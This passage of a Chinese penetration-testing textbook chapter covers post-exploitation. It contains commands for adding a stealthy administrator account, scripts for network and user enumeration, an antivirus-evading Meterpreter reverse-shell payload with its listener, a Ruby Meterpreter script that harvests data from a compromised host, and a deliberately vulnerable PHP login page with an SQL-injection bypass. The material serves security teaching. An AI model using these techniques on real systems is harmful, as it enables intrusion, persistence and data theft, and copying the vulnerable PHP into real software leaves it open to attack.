  \ /add\nnet localgroup \"System Admins\" /add\nnet localgroup Administrators \"\
  System Admins\" /add\nnet localgroup \"System Admins\" admin /add\n```\n\n警告\n\n\
  在向系统添加新用户时，我们必须小心，确保不会因测试系统而削弱其安全性。请务必使用强密码。如果我们为他人进入我们正在测试的系统提供便利，那么我们的测试生涯将非常短暂！\n\
  \n我们首先添加一个名为 admin 的新用户，密码为 SecUr3P4Ssw0Rd!。使用 admin 用户可能会降低被检测到的几率，因为它听起来像一个合法的用户名。我们创建一个名为\
  \ System Admins 的新本地组，然后将该组添加到 Administrators 组中。现在，任何被插入到 System Admins 组的用户都将因继承而成为管理员，因此我们将\
  \ admin 用户添加到 System Admins 组。这样，我们在系统上就有了自己的管理员用户。如果我们想在域内执行此操作，则需要在创建用户时添加 `/DOMAIN`\
  \ 标志，并使用 `net group` 命令代替 `localgroup`。如果我们的本地管理员用户创建成功，输出应类似于图 10.4。\n\n![image](img/F000102f10-04-9781597497299.jpg)\n\
  \n图 10.4 在 Windows 中添加本地管理员用户\n\n## 收集网络信息\n\n一旦我们获得对网络中某个新主机的访问权限，我们希望尽可能多地了解该主机所在的网络。我们想知道那里还有哪些其他主机，该主机可以访问哪些类型的网络，以及该主机正在与谁通信。为了确定这些信息，手头准备一些基本的\
  \ shell 脚本以便快速提取这些信息会很有帮助。\n\n### Windows 网络信息收集\n\n在查看 Windows 机器时，有许多信息令我们感兴趣。我们想知道机器有哪些接口，以确定主机所在的网络及其规模。我们需要路由表，以了解网关以及任何特殊的路由规则。我们还想知道开放连接以及管理这些连接的进程，以便识别系统的功能及其正在与哪些其他系统通信。\n\
  \n```\nipconfig /all >> c:\\network.txt\nroute print >> c:\\network.txt\narp –a\
  \ >> c:\\network.txt\nnetstat –ano >> c:\\network.txt\ntasklist /V >> c:\\network.txt\n\
  ```\n\n为了收集系统上所有网络接口的信息，并包含重要内容，如域名系统（DNS）服务器、动态主机配置协议（DHCP）服务器和 DNS 名称，我们使用 `ipconfig`\
  \ 命令。`/all` 标志告诉 `ipconfig` 提供其拥有的关于网络接口的任何信息。这确保我们不会遗漏任何内容。我们将输出发送到 `network.txt`\
  \ 文件中，以便我们可以卸载一个包含所有数据的文件。\n\n带有 `print` 参数的 `route` 命令显示系统的所有路由信息。由此我们可以确定默认网关并查看任何特殊路由规则。这对于确定哪种类型的攻击能为我们提供最佳结果以\
  \ pivot 到下一个资源非常有用。\n\n`arp` 命令允许我们操作系统的地址解析协议（ARP）表，而 `–a` 标志告诉 `arp` 命令打印其缓存的所有\
  \ ARP 条目。这将告诉我们主机知道的本地网络上的其他系统。这有助于我们了解本地网络上还有哪些其他主机，而无需发送额外的流量。\n\n`netstat` 命令列出开放的网络连接和其他网络统计信息。使用\
  \ `netstat` 时，`–a` 选项告诉它列出所有连接，`–n` 选项告诉它仅使用数字输出，以便不尝试进行 DNS 解析，而 `–o` 选项列出拥有该连接的进程。虽然这告诉我们哪些连接是开放的，但我们只知道哪些进程\
  \ ID 正在使用这些连接。当我们将此信息与 `tasklist` 命令的结果合并时，我们可以看到每个连接正在使用哪个应用程序。\n\n`tasklist` 命令列出系统上运行的所有进程，当我们使用详细选项\
  \ `/V` 时，我们可以获得进程名称、ID，甚至二进制文件的路径。这在查看目标主机的系统信息以及排查恶意软件问题时都很有用。\n\n### Linux 网络信息收集\n\
  \n我们在收集 Windows 信息时使用的许多命令在 Linux 上也会类似。我们想要收集系统上的 IP 地址、路由、DNS 信息以及网络连接及其所属进程。为了收集关于每个连接所属进程的信息，我们需要以\
  \ root 身份登录系统。让我们构建脚本。\n\n```\nip addr >> /tmp/net.txt\necho \"-------------\" >>\
  \ /tmp/net\ncat /etc/resolv.conf >> /tmp/net\necho \"-------------\" >> /tmp/net\n\
  netstat –rn >> /tmp/net\necho \"-------------\" >> /tmp/net\n```\n\n\n\n\n\n```\n\
  netstat –anlp >> /tmp/net\n```\n\n对于运行的每个 Linux 命令，我们可能没有明确的标题来指示这是一个新命令，因此我们在每个命令之间添加一个行分隔符，以便轻松找到每个命令的输出。我们从\
  \ `ip` 命令开始，它显示有关 IP 栈的信息。`addr` 选项告诉命令列出系统上的每个 IP 地址。要确定 DNS 信息，没有像 Windows 中那样简单的命令可以运行。收集\
  \ DNS 信息最简单的方法是查看 `/etc/resolv.conf` 文件。该文件是系统 DNS 信息的配置文件，如果所有系统工具都查阅此文件，那么对我们来说就足够了。\n\
  \n要收集路由信息和其他连接信息，我们可以像在 Windows 上一样使用 `netstat` 命令。要收集路由信息，我们可以使用 `-r` 选项。通过在任何命令中指定\
  \ `-n` 选项，我们指示 `netstat` 不要使用 DNS 解析，因为这会减慢执行速度。将路由信息打印到文件后，我们再次使用 `netstat` 打印所有连接以及拥有每个连接的进程。`-a`\
  \ 标志告诉 `netstat` 打印所有连接，`-l` 标志告诉 `netstat` 也打印监听中的连接，`-p` 标志告诉 `netstat` 打印拥有每个连接的进程。现在，我们知道了关于已入侵主机网络的所有信息。\n\
  \n如果我们还想了解系统上的用户，可以获取 `/etc/passwd` 文件。该文件包含系统上每个用户的大部分登录信息。`/etc/passwd` 文件包含用户\
  \ ID、主目录、默认 shell，以及经常包含姓名和办公室号码等信息。要了解更多关于 `/etc/passwd` 文件的信息，我们可以使用 `man 5 passwd`\
  \ 命令，该命令将详细说明文件中每个字段的作用。\n\n注意\n\n`man` 命令允许我们在系统内部引用系统文档。要查找命令的信息，请键入 `man <commandname>`\
  \ 或 `man -k <concept>`，其中 `<concept>` 可以是任何内容，从密码到字符串。`-k` 命令搜索关键字，因此如果我们使用命令名称找不到所需内容，可以搜索我们正在寻找的概念来找到答案。\n\
  \n## 编写 Metasploit Meterpreter 脚本\n\nMetasploit Meterpreter 是一个高级 shell，可简化系统上的后渗透任务。Meterpreter\
  \ 可以路由流量、运行插件和脚本、帮助我们在 Windows 系统上提升权限，并帮助我们与已入侵的主机进行交互。Meterpreter 如此方便的部分原因在于它提供了一套标准命令，用于收集进程列表、转储密码哈希、模拟用户等。在可以使用的情况下，Meterpreter\
  \ 是使用 Metasploit 时的优秀有效载荷选择。Meterpreter 最强大的能力之一是通过插件和脚本进行扩展。在本节中，我们将重点介绍如何使用 Meterpreter\
  \ API 构建脚本。\n\n### 获取 shell\n\n在开始使用 Meterpreter 之前，我们需要获取一个 Meterpreter shell。我们将通过\
  \ Metasploit 的 `msfconsole` 生成一个有效载荷。除了能够启动漏洞利用和辅助文件外，我们还可以在 `msfconsole` 内部生成有效载荷，以获得比在命令行上工作时更具交互性的体验。运行\
  \ `msfconsole` 后，让我们看看代码。\n\n```\nmsf > use payload/windows/meterpreter/reverse_tcp\n\
  msf (reverse_tcp) > set LHOST <Backtrack Host IP>\nmsf (reverse_tcp) > generate\
  \ –t exe –E –i 5 –f msf-backdoor.exe\n```\n\n`msfconsole` 具有 Tab 补全功能，因此我们在输入模块时不必键入完整路径。当我们输入几个字符后按\
  \ Tab 键，它会尽可能多地补全命令。我们想要使用 `meterpreter/reverse_tcp` 模块，创建一个将回连到我们的 Meterpreter\
  \ 有效载荷。`reverse_tcp` 模块有两个选项：本地主机（`LHOST`）和有效载荷应回连的端口。端口的默认值是 4444，我们将保持该值，因此我们只需将\
  \ `LHOST` 变量设置为我们的 IP 地址。设置好变量后，我们可以使用 `generate` 命令生成有效载荷。`generate` 命令有许多选项，但我们使用的有：`-t\
  \ exe` 选项表示我们希望生成一个可执行文件，`-E` 选项表示我们希望对其进行编码以增加杀毒软件检测的难度，`-i 5` 选项表示编码五次，`-f` 选项指定文件名。Metasploit\
  \ 现在生成了一个文件，我们可以将其传输到 Windows 机器上运行，并获得一个后门 shell。图 10.5 概述了这一过程。\n\n![image](img/F000102f10-05-9781597497299.jpg)\n\
  \n图 10.5 使用 Metasploit 构建 Windows 有效载荷\n\n接下来，我们需要将可执行文件复制到 Windows 机器上。我们可以通过多种方式实现，包括使用通用串行总线（USB）、简单文件传输协议（TFTP），甚至编写脚本来自动传输。一旦文件在系统上，我们需要使用另一个\
  \ Metasploit 模块来接收回连。当我们使用 `exploit/multi/handler` 时，我们运行的是一个除了处理回连连接外不做任何事的漏洞利用。要处理传入的连接，我们需要运行以下命令：\n\
  \n```\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\n\
  set LHOST <your IP>\nexploit\n```\n\n当我们的代码运行时，我们应该会看到一条消息，表明它正在监听连接。现在我们在 Windows\
  \ 机器上运行可执行文件。这将导致可执行文件回连到我们的监听器并打开我们的 shell。图 10.6 显示了 shell 的打开。我们现在有了一个 Meterpreter\
  \ 连接来运行我们的脚本。\n\n![image](img/F000102f10-06-9781597497299.jpg)\n\n图 10.6 成功的 Meterpreter\
  \ Shell 连接\n\n### 构建基本脚本\n\n到目前为止，我们已经在本章中构建了一些 shellcode 片段。我们有列出用户、组和网络信息的方法。下一步是将这些代码放入一种格式，以便在入侵主机时轻松运行。Metasploit\
  \ Meterpreter 脚本是实现这一目标的简单方法。它们用 Ruby 编写，一旦我们获得 shell，就由 Meterpreter 执行。这些脚本是标准\
  \ Ruby 和 Metasploit 应用程序编程接口（API）调用的组合，可以与我们的 shell 交互。\n\n脚本保存在 `/pentest/exploit/framework3`\
  \ 目录下的 `scripts/meterpreter` 目录中。要构建我们的脚本，我们可以采用其他人编写的片段，并将它们组合成执行我们所需功能的定制工具。首先，让我们在\
  \ `scripts/meterpreter` 目录中创建一个名为 `windump.rb` 的脚本。\n\n首先，我们需要确定脚本需要哪些选项。如果我们的脚本能够列出用户、组和网络信息，那就太好了。有时我们可能只需要一个、两个或全部三个选项。为此，我们将使用\
  \ Meterpreter 内置的选项处理。让我们来看一下。\n\n```\n@client = client\nopts = Rex::Parser::Arguments.new(\n\
  \   \"-h\" => [ false, \"帮助菜单。\" ],\n   \"-u\" => [ false, \"转储用户信息\" ],\n   \"\
  -g\" => [ false, \"转储组信息\" ],\n   \"-n\" => [ false, \"转储网络信息\" ],\n   \"-a\" =>\
  \ [ false, \"转储所有信息\" ],\n)\n```\n\n\n\n\n我们的第一行代码从局部变量 `client` 创建了一个全局变量。虽然我们的脚本中目前没有函数，但如果以后决定添加函数，那么在代码中统一引用全局\
  \ `client` 对象会更方便。这确保了即使我们将代码移入函数，也无需担心作用域问题。接下来，我们使用 `Rex::Parser::Arguments` 类创建一个新的参数解析器。我们拥有的每个选项（例如\
  \ `-u` 选项）都包含两条必需的信息。列表中的第一个选项表示该选项是否接受参数。由于我们的所有选项都不需要额外信息，因此每个选项的选项列表第一个元素都是 `false`，表示它们没有关联的参数。列表中的第二个选项是帮助字符串，当使用\
  \ `-h` 标志时会显示该字符串。这段文本用于说明每个选项的含义，这样我们就不必猜测每个选项的用法了。\n\n```\nuser = net = group\
  \ = 0\n\nopts.parse(args) { |opt, idx, val|\n   case opt\n   when ’-u’\n     user\
  \ = 1\n   when ’-g’\n     group = 1\n   when ’-n’\n     net = 1\n   when ’-a’\n\
  \     user = net = group = 1\n   when \"-h\"\n     print_line \"WinDump - Dump Windows\
  \ Information\"\n     print_line\n     print_line \"Dumps users, groups, and network\
  \ information on a\"\n     print_line \"Windows system and logged to #{::File.join(Msf::Config.log_directory,’scripts’,\
  \ ’windump’)}\"\n     print_line(opts.usage)\n     raise Rex::Script::Completed\n\
  \   end\n}\n```\n\n现在我们已经设置好了解析器，接下来的代码用于管理选项。首先，我们将可能支持的每个选项的变量初始化为 0，这样默认值就是不执行任何检查。接着，我们使用\
  \ `opts` 对象解析传递给脚本的参数。我们遍历每个参数，对于每个参数，我们可以使用三条信息：选项、索引和选项的值。在这个实例中，我们只关心传入的选项，因为所有选项都不需要值。\n\
  \n我们根据选项集创建一个 case 语句，当选项为 `-u`、`-g` 或 `-n` 时，将相应的变量设置为 true。当选项为 `-a` 时，我们将三个变量都设置为\
  \ true。但如果选项是 `-h`，我们需要打印一些基本的帮助信息。首先打印一些关于脚本用途的头部信息。头部信息打印完毕后，我们输出 `opts.usage`\
  \ 的结果，利用设置解析器时生成的所有信息，为用户提供有用的帮助信息。这样即使我们添加了选项，也无需更新用法信息，因为选项解析器会确保包含所有必要内容。\n\n\
  现在选项已经处理完毕，我们可以进入脚本的生产性部分了。我们希望将数据记录到易于获取结果的位置。在用户主目录的 `.msf3/logs/scripts` 目录中，Metasploit\
  \ 会存储我们运行脚本的输出。有一些内置变量可以帮助我们协调日志位置。让我们看看代码。\n\n```\nhost = @client.tunnel_peer.split(’:’)[0]\n\
  time = ::Time.now.strftime(\"%Y%m%d.%M%S\")\nlogfile = ::File.join(Msf::Config.log_directory,’scripts’,\
  \ ’windump’,Rex::FileUtils.clean_path(\"#{host}_#{time}.txt\"))\n::FileUtils.mkdir_p(::File.dirname(logfile))\n\
  out = \"\"\n```\n\n为了获取主机名，`client` 对象有一个名为 `tunnel_peer` 的值，它以 `hostname:port`\
  \ 的格式保存远程主机和端口。要获取主机名，我们取 `tunnel_peer` 的值，根据冒号分割，然后取数组的第一个元素（即主机名），并将其赋值给 `host`\
  \ 变量。构建主机名所需的另一个变量是当前时间。为了区分对同一主机的多次脚本运行，我们需要为每个日志文件添加时间戳，以便知道其创建时间。我们通过使用 `Time`\
  \ 类来实现这一点。`Time` 类有一个名为 `now` 的方法，它返回当前时间。通过在该值上使用 `strftime` 方法，我们可以将时间格式化为 YYYYMMDD.MMSS，其中\
  \ Y 表示年，M 表示月，D 表示日，M 表示分钟，S 表示秒。这样我们就可以在同一天进行多次扫描。\n\n下一步是构建文件路径。通过使用 `File` 类的\
  \ `join` 方法，我们可以将目录路径的多个部分用适当的斜杠连接起来，形成文件路径。第一个参数是 `Msf::Config.log_directory`，这是一个包含日志存储位置的变量。第二个参数是\
  \ `scripts`，即日志下存储脚本输出的子目录。第三个参数是 `windump`，即脚本的名称。第四个参数是 `Rex::FileUtils.clean_path`\
  \ 方法的输出。该方法确保即使主机名中包含特殊字符，文件路径仍然可用。我们将一个包含 `host`、`time` 和 `.txt` 扩展名（表示输出为文本字符串）的字符串传递给\
  \ `clean_path` 方法。`join` 方法将所有部分组合成一个完整的文件路径，并将该值赋值给 `logfile` 变量。\n\n现在有了日志名称和路径，我们需要确保目录存在。为此，我们使用\
  \ `FileUtils.mkdir_p` 方法来验证文件路径中的所有目录是否存在，如果不存在，`mkdir_p` 会为我们创建它们。我们要创建的路径是 `logfile`\
  \ 变量中文件名之前的所有部分。通过使用 `File` 类的 `dirname` 函数，我们可以从变量中程序化地获取该目录，而无需进行额外的解析。\n\n在开始运行之前构建的脚本之前，最后一步是初始化输出缓冲区。我们使用\
  \ `out` 变量创建一个空字符串。随着脚本的进行，我们将数据追加到 `out` 变量中，然后在脚本结束时，将 `out` 的内容保存到我们创建的文件名中。\n\
  \n```\nif user\n   @client.sys.process.execute(\"cmd.exe /C wmic /append:c:\\\\\
  user.out useraccount get Name\", nil, {’Hidden’ => true })\n   running = 1\n   while\
  \ running == 1\n     running = 0\n     @client.sys.process.get_processes().each\
  \ do |proc|\n       if \"wmic.exe\" == (proc[’name’].downcase)\n         sleep(1)\n\
  \         running = 1\n       end\n     end\n   end\n```\n\n在下一段代码中，我们检查 `user`\
  \ 标志是否被设置。如果是，则启动转储系统用户的代码。我们使用 `client` 对象访问 `sys` 类的 `process` 类。我们使用 `process`\
  \ 类的 `execute` 方法来启动第一个命令。我们希望运行 `cmd.exe`（即 Windows 外壳），并带上 `/C` 标志，该标志告诉 `cmd.exe`\
  \ 它将接收要运行的代码作为请求的一部分。`cmd.exe` 运行 `wmic` 命令，并带上 `/append` 标志，指示输出应写入 C 盘根目录下的 `user.out`\
  \ 文件。我们需要对每个反斜杠字符进行转义，以免被解释为转义字符。在代码中，路径中出现的每个反斜杠字符都会有两个。我们向 `wmic` 命令传递参数 `useraccount\
  \ get name`，以获取账户名称列表。\n\n`execute` 命令的第二个参数包含命令的参数。由于我们已经将所有内容写在一行中，因此不需要使用这个选项。第三个参数是一个选项哈希。在这种情况下，我们希望进程的执行是隐藏的，因此将\
  \ `Hidden` 键设置为 `true`。现在选项设置完毕，脚本将在后台运行。由于我们没有创建与进程通信的特殊通道，如何知道进程何时结束？我们需要编写一些代码来实现这一点。\n\
  \n\n\n\n我们将变量 `running` 设置为 1，因为我们知道刚刚执行了命令。在 `wmic` 命令运行期间，我们需要持续等待，因此创建一个 while\
  \ 循环来等待 `wmic` 命令停止。每次 while 循环开始新迭代时，我们将 `running` 变量设置为 0，因为如果在循环中没有遇到 `wmic`\
  \ 进程，说明它已停止，我们应继续执行脚本。\n\n接下来，我们通过 `get_process` 方法获取系统上的所有进程，开始循环。遍历这些进程，将每个进程赋值给\
  \ `proc` 变量。在每次循环迭代中，检查进程名称是否等于 `wmic.exe`。如果是，则使用 `sleep` 等待一秒，并将 `running` 标志重新设置为\
  \ 1。\n\n```\n  p = @client.sys.process.execute(\n     \"cmd.exe /C for /F \\\"skip=1\\\
  \" %i in (’type c:\\\\user.out’) do net user %i \" , nil, {’Hidden’ => true, ’Channelized’\
  \ => true})\n  out << \"Gathering user information\\n\"\n  while(data = p.channel.read)\n\
       out << data\n  end\n  p.channel.close\n  p.close\n  @client.sys.process.execute(\"\
  cmd.exe /C del c:\\\\user.out\", nil, {’Hidden’ => true })\nend\n```\n\n一旦 `wmic`\
  \ 的输出完成，我们需要执行命令的后半部分。我们希望获取每个已找到用户的 `net user` 输出。我们再次执行一个进程，设置 `hidden` 参数以及 `channelized`\
  \ 参数为 true。`channelized` 参数允许我们在进程启动后与其交互。我们需要读取进程打印的输出，因此必须将其通道化才能读取。将创建的进程赋值给\
  \ `p` 变量，当能够从进程的通道对象读取数据时，将信息追加到 `out` 变量中。数据读取完毕后，关闭通道和进程对象，以便 Ruby 释放对象占用的内存。最后一步是删除\
  \ `user.out` 文件，因此再运行一个进程来完成。文件清理完毕后，用户信息收集就完成了。\n\n```\nif group\n\n   grpcmd =\
  \ \"cmd.exe /C for /F \\\"delims=^∗ tokens=1 skip=4\\\" %i in (’net localgroup’)\
  \ do net localgroup %i\"\n\n   p = @client.sys.process.execute(grpcmd, nil,\n\n\
       {’Hidden’ => true, ’Channelized’ => true})\n\n   out << \"Gathering group information\\\
  n\"\n\n   while(data = p.channel.read)\n\n     out << data\n\n   end\n\n   p.channel.close\n\
  \n   p.close\n\nend\n```\n\n脚本的下一步是执行枚举本地组的命令。我们再次创建一个进程，并一步运行命令，设置 `channelized`\
  \ 以便捕获输出。将标题追加到输出缓冲区，然后读取命令的输出并同样追加。命令执行完毕后，关闭通道和进程。这与用户进程的最后一步非常相似，只是我们能够一步完成，因为我们没有使用\
  \ `wmic`。\n\n```\nif net\n\n   netcmds = [\n\n     \"ipconfig /all\",\n\n     \"\
  route print\",\n\n     \"arp -a\",\n\n     \"netstat -ano\",\n\n     \"tasklist\
  \ /V \"\n\n   ]\n\n   netcmds.each do |cmd|\n\n     p = @client.sys.process.execute(cmd,\
  \ nil,\n\n       {’Hidden’ => true, ’Channelized’ => true})\n\n     out << \"Running\
  \ command #{cmd}\\n\"\n\n     while(data = p.channel.read)\n\n       out << data\n\
  \n     end\n\n     p.channel.close\n\n     p.close\n\n   end\n\nend\n```\n\n如果在运行脚本时指定了网络选项，那么并非只需要运行一个命令来收集所有所需信息。我们将每个命令放入一个名为\
  \ `netcmds` 的数组中。遍历该数组，运行每个应用程序，并将输出追加到缓冲区中。为命令创建一个 each 循环，每个命令都以 `channelized`\
  \ 和 `hidden` 方式运行。脚本为每个执行的命令向日志缓冲区写入一条横幅，然后读取所有数据并追加到输出缓冲区。所有命令运行完毕后，我们应该拥有识别主机网络信息所需的所有数据。\n\
  \n```\nfile_local_write(logfile,out)\n\nprint_status(\"WinDump has finished Running\"\
  )\n```\n\n现在是将数据写入输出文件的时候了。我们使用内置函数 `file_local_write` 将输出缓冲区 `out` 写入日志文件 `logfile`，该文件在脚本开头指定。最后，为了告知运行脚本的人脚本已成功完成，我们使用\
  \ `print_status` 函数在屏幕上打印一条成功信息。脚本运行时，应在 `~/.msf3/logs/scripts/windump` 目录下创建一个新文件，其中存储了我们原本需要复制粘贴到命令窗口的所有命令的输出。我们将文件保存为\
  \ `windump.rb`，放在 `/pentest/exploits/framework3/scripts/meterpreter` 目录下，现在可以测试了。\n\
  \n### 执行脚本\n\n回到 Meterpreter 中打开的会话，我们可以运行脚本并验证其是否正常工作。为了验证脚本位于正确位置且能被 Metasploit\
  \ 识别，我们首先执行命令 `windump –h`。如图 10.7 所示，这将打印帮助信息，表明脚本位置正确且能被正确识别。现在，关键时刻到了，我们运行 `windump\
  \ –a` 来转储所有需要的信息：用户、组和网络信息。图 10.7 显示了如果所有代码正确集成且脚本无问题完成时的输出。检查 `/root/.msf3/logs/scripts/windump`\
  \ 目录下是否有新创建的文件，应该能看到新文件。我们成功创建了一个 Meterpreter 后期利用脚本，可以在其他场景中使用。\n\n![image](img/F000102f10-07-9781597497299.jpg)\n\
  \n图 10.7 `windump` 脚本成功完成\n\n## 数据库后期利用\n\n万维网自 20 世纪 90 年代初诞生以来已取得了长足发展。越来越多的应用正转向软件即服务（SaaS）和基于\
  \ Web 的应用。随着这一趋势，越来越多的数据变得可通过 Web 访问。随之而来的是，托管数据的 Web 服务的安全性变得至关重要。\n\nSQL 注入（SQLi）漏洞已经存在很长时间，但它们仍然会出现在应用中。由于信用卡数据、个人信息和其他敏感信息存储在\
  \ Web 应用中，渗透测试人员需要能够评估 Web 应用的安全性，并能够创建概念验证（POC）来帮助应用开发者理解 SQLi 漏洞的严重性及其工作原理。\n\n\
  本节重点介绍 SQLi 漏洞以及利用和后期利用这些漏洞的基础知识。我们将以 MySQL 和 Microsoft SQL 为重点，探讨利用这些 SQLi 漏洞绕过安全性、确定存在哪些数据以及提取数据的不同方法。在某些情况下，我们甚至可以利用\
  \ SQLi 漏洞启动 shell。\n\n### 什么是 SQL 注入？\n\nSQL 注入与我们在第 9 章中研究的许多其他 Web 漏洞一样，是输入清理不严的结果。当用户输入被添加到发送给理解结构化查询语言（SQL）的服务器的字符串中，并且该输入包含被\
  \ SQL 服务器解释而非视为数据的信息时，就会发生 SQLi。例如，如果查询正在查找数据，作者期望某人输入一个单词（如 `Ruby`），但用户输入的是 SQL\
  \ 代码，那么该代码可能会被 SQL 服务器解释并执行。\n\n\n\n\n我们将探讨几种在运行查询前未对用户输入进行清理的查询方式，并确定如何利用代码作者的疏忽来操控\
  \ SQL 服务器。我们将重点关注渗透测试中常见的两种主要 SQL 服务器：MySQL 和 Microsoft SQL Server。虽然两者在利用 SQL 查询方面有相似之处（因为\
  \ SQL 语言是标准化的），但与其他标准一样，存在一些解释和扩展，使得利用不同服务器类型时略有差异。我们将研究这些服务器在被利用后的一些差异和功能。\n\n\
  ### MySQL\n\nMySQL 数据库是一种开源数据库，深受网页设计师欢迎，因为它免费、可在大多数 Linux 发行版上使用，并且与 PHP 配合良好。有许多公开教程帮助人们学习\
  \ MySQL，但大多数文章并未专注于构建安全应用程序。在本节中，我们将利用这一疏忽，研究测试中可能遇到的两种基本场景，并探讨如何利用每种疏忽来进一步获取应用程序或数据的访问权限。\n\
  \n#### 身份验证绕过\n\n当我们被分配测试一个应用程序时，通常遇到的第一页就是登录页面。很多时候我们会获得登录系统的凭据，但在使用这些凭据之前，我们需要检查并确定是否可以绕过登录页面的控制。让我们看一个简单的登录页面，并研究如何测试该页面是否存在身份验证绕过漏洞。\n\
  \n```php\n<?php\n   session_start();\n   if ($_POST['login'] && $_POST['pass'])\n\
  \   {\n     $c = mysql_connect('localhost','testapp','test123');\n     $q = mysql_query(\"\
  select * from testapp.login where login = '{$_POST['login']}' and pass = '{$_POST['pass']}'\"\
  ,$c);\n       if (mysql_num_rows($q) > 0)\n       {\n         $_SESSION['authed']\
  \ = 1;\n         header('Location: search.php');\n         exit();\n       }\n \
  \  }\n?>\n<FORM METHOD=POST>\nLogin: <INPUT TYPE=TEXT NAME=login><BR>\nPass: <INPUT\
  \ TYPE=PASSWORD NAME=pass><BR>\n<INPUT TYPE=SUBMIT VALUE=\"Login!\"><BR>\n</FORM>\n\
  ```\n\n该脚本的 PHP 代码首先创建一个会话，用于在 `$_SESSION` 数组中跟踪用户信息，该信息将在页面浏览之间持续存在。如果通过 POST 方法提交了数据，脚本会检查是否同时提交了\
  \ `login` 和 `pass` 变量。如果没有，脚本就无法检查用户名和密码是否在数据库中匹配。接下来，脚本使用我们将要创建的凭据连接到 MySQL 数据库。现在脚本已连接到数据库，接下来要在数据库中搜索用户提交的输入。\n\
  \n执行的查询旨在从数据库中获取所有记录，其中数据库中的 login 字段包含通过提交表单的 login 字段发送的信息，并且 pass 字段与密码字段匹配。每个数据都用单引号括起来。只要用户发送的输入中不包含单引号，这种方法就能正常工作。如果包含单引号，则用于结束搜索数据的单引号会过早闭合，提交字符串的其余部分将作为查询的一部分执行。如果查询返回信息，表单会在会话中设置一个已认证标志，并将用户发送到搜索页面。让我们完成数据库的设置，以便进行测试。\n\
  \n```sql\ncreate database if not exists testapp;\ngrant all privileges on testapp.*\
  \ to testapp@localhost identified by 'test123';\ncreate table if not exists testapp.login\
  \ (login varchar(10), pass varchar(10));\ninsert into testapp.login values('admin','admin123');\n\
  create table if not exists testapp.wordlist (word varchar(25));\ninsert into testapp.wordlist\
  \ values ('this'), ('that'), ('now'), ('happy'), ('sad'), ('coding'), ('for'), ('pentesters'),\
  \ ('ruby'), ('python');\n```\n\n为了为脚本设置数据库，在 MySQL 运行后，我们需要创建数据库并输入示例数据。上述 SQL 脚本创建了\
  \ testapp 数据库，然后授予 testapp 用户使用该数据库的权限，密码为 test123。接着，它创建了一个包含 login 和 pass 两个变量的\
  \ login 表。表创建后，第一个登录记录被插入，登录名为 admin，超级秘密密码为 admin123。现在身份验证表已设置好，我们将在下一个示例中提取一些数据，因此我们继续创建一个表来存储单词列表，并将这些单词插入\
  \ wordlist 表。\n\n我们需要将 SQL 脚本导入数据库。通过将这些查询保存到文件（本例中为 `addsql.sql`），我们可以用一条命令运行这些查询。将这些命令保存到文件还有一个额外的好处：我们可以使用文本编辑器构建命令，而不必使用\
  \ MySQL shell，并且如果需要再次执行这些命令，也不必记住输入的内容。当我们执行命令 `mysql -u root -p < addsql.sql`\
  \ 时，mysql 客户端将从我们创建的 `addsql.sql` 文件中读取输入并在服务器上运行。`-u` 选项指定要使用的用户名，`-p` 选项表示在命令运行时需要指定密码。我们使用小于号表示正在从文件发送数据作为应用程序的标准输入。这样做重定向可以避免逐个输入每个命令，从而减少出错的可能。命令运行时，会提示输入密码，我们输入\
  \ toor（BackTrack 的默认密码）。\n\n让我们看看登录页面。将页面保存为 `/var/www` 目录下的 `login.php`，如果 Apache\
  \ 正在运行，我们应该能够访问 `http://localhost/login.php` 并看到登录页面。回顾该页面的代码，每个数据字段都用单引号括起来。由于页面期望返回数据，我们需要帮助\
  \ SQL 查询返回有效数据。\n\n原始提交的查询是：`select * from testapp.login where login = '{$_POST['login']}'\
  \ and pass = '{$_POST['pass']}'`\n\n如果我们不知道有效的登录名，就需要操纵语句使其无论如何都返回行。SQL 也有条件判断，因此在本例中，我们有两个条件通过\
  \ and 连接，两者都必须为真。如果我们创建一个 or 条件，确保条件始终为真，就能保证查询始终返回数据。\n\n为了测试这一点，我们需要一个 login 值，使语句始终返回真。当我们输入\
  \ `' or 1=1` 作为 login 时，语句将变为：\n\n`select * from testapp.login where login = ' '\
  \ or 1=1 ' and pass = '{$_POST['pass']}'`\n\n这更接近我们的目标，但有一个问题：多了一个单引号，并且表达式的第二部分仍然必须为真。通过使用\
  \ MySQL 的注释语法，我们可以告诉表达式忽略注释后的任何内容。\n\nMySQL 使用两个短横线作为注释字符。当我们将表达式改为 `' or 1=1 --`\
  \ 时，语句变为：\n\n`select * from testapp.login where login = ' ' or 1=1 --' and pass\
  \ = '{$_POST['pass']}'`\n\n这更接近了，但使用双短横线注释时，短横线后面必须有一个空格；否则 MySQL 无法明确识别为注释。在注释后加一个空格，我们就得到了一个始终返回真的语句，从而返回数据。\n\
  \n\n\n\n最后要克服的是脚本开头的输入检查。该脚本会检查 `login` 和 `pass` 字段中是否有数据。当我们在用户名字段中输入 `' or 1=1\
  \ --`，并在密码字段中输入任意内容时，它应该允许我们登录。我们通过重写 SQL 语句绕过了登录限制，利用用户名字段让脚本执行我们想要的代码，而不是原本预期的代码。图\
  \ 10.8 显示了提交前页面中的输入。当我们在现实世界中遇到此类漏洞时，现在应该知道在需要获取访问权限时如何应对易受攻击的应用程序。\n\n![image](img/F000102f10-08-9781597497299.jpg)\n\
  \n图 10.8 绕过 `login.php` 的登录限制\n\n#### 返回额外记录\n\n现在我们已经通过了登录页面，进入了一个 `search.php`\
  \ 页面，在这里我们可以搜索上一个示例中创建的 `wordlist` 表。搜索页面允许我们搜索表中的单词，并将找到的单词打印到屏幕上。让我们来审查一下代码。\n\
  \n```php\n<?php\n\n   session_start();\n\n   if($_SESSION['authed'] != 1)\n\n  \
  \ {\n\n     header('Location: login.php');\n\n     exit();\n\n   }\n\n?>\n\n<FORM\
  \ METHOD=POST>\n\nSearch for: <INPUT TYPE=TEXT NAME=word>\n\n&nbsp;&nbsp;<INPUT\
  \ TYPE=SUBMIT VALUE=\"Search!\">\n\n</FORM>\n\n<BR><BR>\n\nSearch Results:<BR>\n\
  \n<?php\n\n   if($_POST['word'])\n\n   {\n\n     $c = mysql_connect('localhost','testapp','test123');\n\
  \n     mysql_select_db(\"testapp\",$c);\n\n     $query = \"select * from wordlist\
  \ where word like '%{$_POST['word']}%'\";\n\n     $q = mysql_query($query,$c);\n\
  \n     while($row = mysql_fetch_array($q))\n\n     {\n\n      print \"{$row[0]}<BR>\\\
  n\";\n\n     }\n\n    }\n\n?>\n```\n\n`search.php` 代码首先检查用户是否成功通过身份验证。如果会话认证标志未设置，则会将用户重定向回\
